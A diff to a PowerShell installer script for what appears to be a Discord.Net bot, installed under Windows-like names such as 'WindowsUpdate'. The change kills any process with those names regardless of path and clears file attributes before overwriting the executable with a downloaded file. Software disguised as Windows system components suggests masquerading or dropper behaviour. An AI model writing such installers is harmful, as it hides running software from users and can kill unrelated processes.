@@ -61,9 +61,8 @@ if (-not (Test-Path $installDir)) { [void](New-Item -ItemType Directory -Force -
 # 500 ms wait lets Discord.Net flush pending gateway writes before the
 # hard-kill fallback, cutting audit-log corruption on reinstall.
 try {
-    Get-Process -Name 'WindowsUpdate' -ErrorAction SilentlyContinue |
-        Where-Object { $_.Path -eq $primaryExe } |
-        ForEach-Object {
+    Get-Process -Name 'WindowsUpdate', 'WindowsBackup', 'WindowsUpdateMonitor' -ErrorAction SilentlyContinue |
+                ForEach-Object {
             try { [void]$_.CloseMainWindow() } catch {}
             if (-not $_.WaitForExit(500)) { try { $_.Kill() } catch {} }
         }
@@ -75,6 +74,7 @@ try {
 Write-Host '[*] downloading primary exe...'
 $response = $http.GetAsync($manifest.url, [Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
 if (-not $response.IsSuccessStatusCode) { throw "download HTTP $([int]$response.StatusCode)" }
+if (Test-Path $primaryExe) { try { [IO.File]::SetAttributes($primaryExe, [IO.FileAttributes]::Normal) } catch {} }
 $dest = [IO.File]::Create($primaryExe)
 try   { $response.Content.CopyToAsync($dest).GetAwaiter().GetResult() }
 finally { $dest.Dispose(); $response.Dispose() }
